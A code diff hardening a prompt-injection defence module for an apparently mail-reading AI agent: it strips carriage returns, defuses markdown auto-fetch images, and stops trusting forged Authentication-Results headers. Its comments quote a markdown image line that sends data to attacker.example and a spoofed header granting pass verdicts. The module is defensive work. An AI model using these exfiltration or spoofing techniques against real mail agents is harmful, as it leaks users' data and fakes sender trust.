@@ -15,9 +15,19 @@ export const MAX_BODY_CHARS = 50_000;
 const INVISIBLE_CHARS =
   /[\u00ad\u180e\u200b-\u200f\u202a-\u202e\u2060-\u2064\u2066-\u2069\ufeff]/g;
 
-/** C0/C1 control characters, tab and newline excepted. */
+/**
+ * C0/C1 control characters, tab and newline excepted.
+ *
+ * CR (U+000D) is deliberately not excepted, though it used to be — it simply
+ * fell between the two ranges. wrapUntrusted splits on `\n` alone, so a lone CR
+ * left everything after it on the same logical line, marked once at the start,
+ * while terminals and log viewers render it as a fresh line and a CR-padded
+ * line can overwrite the datamark a human is reading. It never fooled the model
+ * and could not forge the nonce, but "excepted by accident" is not a property
+ * worth keeping in the function that decides what a reader gets to see.
+ */
 // eslint-disable-next-line no-control-regex
-const CONTROL_CHARS = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g;
+const CONTROL_CHARS = /[\u0000-\u0008\u000b\u000c\u000d-\u001f\u007f-\u009f]/g;
 
 /**
  * Shapes that recur in prompt-injection attempts against mail-reading agents.
@@ -166,10 +176,20 @@ export function stripInvisible(input: string): string {
 
 /**
  * Normalises text before it reaches the model: Unicode-folded, stripped of the
- * characters a human reader cannot see, and length-capped.
+ * characters a human reader cannot see, auto-fetch markup defused, and
+ * length-capped.
+ *
+ * The defusing belongs here, at the boundary, rather than at the call sites
+ * that happen to render a body. Every string this function takes was written by
+ * whoever sent the message, and a subject is as good a place to park
+ * `![](https://attacker.example/p?s=)` as a body is — better, because a subject
+ * is short, quoted back by the model constantly, and was landing in the JSON of
+ * every listing untouched. NFKC runs first on purpose: a fullwidth `！［］（）`
+ * subject folds *into* valid markdown image syntax, so defusing before
+ * normalising would miss it.
  */
 export function sanitizeText(input: string, maxChars = MAX_BODY_CHARS): string {
-  const normalized = stripInvisible(input.normalize('NFKC'))
+  const normalized = defuseAutoFetch(stripInvisible(input.normalize('NFKC')))
     .replace(/[ \t]+/g, ' ')
     .replace(/\n{3,}/g, '\n\n')
     .trim();
@@ -215,16 +235,29 @@ export function detectScriptMix(text: string): string[] {
  *
  * The header is not inherently trustworthy: a sender can include one of their
  * own, and only a receiving server that filters inbound copies guarantees the
- * verdicts are its own. Two defences against that here. Only the *topmost*
- * header is read — a receiving server that does add its own prepends it, so a
- * forged copy further down is ignored. And the authserv-id is compared against
- * the account's own domain; when they are unrelated (or no domain is known)
- * the verdicts are reported with `forgeable: true`, because "pass, says a
- * header anyone could have written" must not read like "pass".
+ * verdicts are its own. Only the *topmost* header is read — a receiving server
+ * that adds its own prepends it, so a forged copy further down is ignored.
+ *
+ * That alone is not enough, and what used to sit here is worth naming because
+ * it looked like a defence. The authserv-id was compared against the account's
+ * own domain, and a match reported `forgeable: false`. But a sender knows the
+ * account's domain — they just addressed mail to it — so on any account whose
+ * provider does not add an Authentication-Results header of its own (common on
+ * small Postfix/Dovecot setups, and on any mailbox where filtering happens
+ * elsewhere) the sender's header was the topmost one, and
+ * `Authentication-Results: mail.example.net; spf=pass; dkim=pass; dmarc=pass`
+ * bought a spoofed message the server's own vouching. The heuristic gave its
+ * strongest answer in exactly the case it could not verify.
+ *
+ * Nothing in the message can settle this, so the operator does:
+ * `IMAP_TRUSTED_AUTHSERV_ID` names the id their provider stamps. Set, it is the
+ * only id that yields `forgeable: false`. Unset, every verdict is reported as
+ * forgeable — noisier, and the honest reading of "pass, says a header anyone
+ * could have written".
  */
 export function parseAuthResults(
   header: string | undefined,
-  accountDomain?: string
+  trustedAuthservId?: string
 ): SecurityAssessment['auth'] {
   // headerValue joins multiple instances with \n, topmost first.
   const topmost = header?.split('\n')[0];
@@ -241,34 +274,21 @@ export function parseAuthResults(
     authservId,
     forgeable:
       authservId === undefined ||
-      accountDomain === undefined ||
-      !domainsRelated(authservId, accountDomain),
+      trustedAuthservId === undefined ||
+      authservId.toLowerCase() !== trustedAuthservId.toLowerCase(),
   };
-}
-
-/**
- * Whether two hostnames share their last two labels — `mx.example.net` and
- * `example.net` do. A heuristic, and a conservative one: providers that
- * authenticate under a different domain than their mailboxes (gmail.com vs
- * mx.google.com) come out as unrelated, which errs towards warning rather
- * than towards trusting a header a sender may have written.
- */
-function domainsRelated(a: string, b: string): boolean {
-  const tail = (host: string): string =>
-    host.toLowerCase().split('.').slice(-2).join('.');
-  return tail(a) === tail(b);
 }
 
 /** Runs every signal over the rendered text plus the headers. */
 export function assess(
   text: string,
   authHeader: string | undefined,
-  accountDomain?: string
+  trustedAuthservId?: string
 ): SecurityAssessment {
   return {
     suspicious: detectSuspicious(text),
     scriptMix: detectScriptMix(text),
-    auth: parseAuthResults(authHeader, accountDomain),
+    auth: parseAuthResults(authHeader, trustedAuthservId),
   };
 }
 
